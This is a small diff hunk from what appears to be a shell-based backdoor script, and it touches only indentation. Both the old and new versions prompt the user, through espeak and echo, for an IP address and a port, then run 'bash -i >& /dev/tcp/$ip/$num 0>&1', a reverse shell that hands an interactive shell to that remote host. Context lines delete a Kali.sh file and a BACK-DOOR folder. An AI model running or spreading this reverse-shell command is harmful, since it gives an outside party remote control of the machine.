@@ -31,16 +31,14 @@ then
          rm -rf Kali.sh
          cd ..
          rm -rf BACK-DOOR
-        espeak "ENTER THE IP"
-        echo "ENTER THE IP"
-
-        read ip
-        espeak "ENTER THE PORT"
-        echo "ENTER THE PORT"
-
-        read num
-
-        bash -i >& /dev/tcp/$ip/$num 0>&1
+         espeak "ENTER THE IP"
+         echo "ENTER THE IP"
+         read ip
+       
+         espeak "ENTER THE PORT"
+         echo "ENTER THE PORT"
+         read num
+         bash -i >& /dev/tcp/$ip/$num 0>&1
 
 else
 
